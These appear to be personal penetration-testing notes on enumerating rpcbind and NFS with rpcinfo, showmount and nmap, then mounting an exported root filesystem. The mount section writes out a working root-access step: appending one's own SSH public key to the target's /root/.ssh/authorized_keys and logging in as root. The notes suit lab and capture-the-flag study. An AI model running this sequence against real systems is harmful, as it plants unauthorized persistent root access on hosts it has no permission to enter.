RPCBIND is a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to server.

So if we see in a nmap scan a rpcbind service running in port 111 this means that there might be other services running in the same port using rpc translation. (UDP or TCP) (these can be: portmapper, status, nfs, nlockmgr, mountd , etc)

so for listing the info we can do:

	rpcinfo -p <ip_address>

	rpcinfo -n <port_number> -p <ip_address>


---
MOUNT
----
If there is a mount service we can user:

showmount: Shows info in a NFS server
	
	sudo showmount -e <ip_addrss> 
	sudo showmount -d <ip_addres>

*-d :lists only directories mounted by client
*-e :shows NFS's export list


We can mount the filesystem previously scanned

so for this we need a file in our system to mount the filesystem
(asumming that everything is shared by the filesystem *)

	mkdir /tmp/r00t
	mount -t nfs <ip_address>:/	/tmp/r00t

*/ means that the entire file was shared


**** If we saw a SSH port opened in a NMAP SCAN ***********
We can create an ssh-key ( $ ssh-keygen ) and append to the mounted file (pub-key)

	cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys

Now we can umount 
	umount /tmp/root

And ssh into the filesystem

	ssh root@<ip.address>

We can Scan the port with NMAP script engine


	nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip_address>
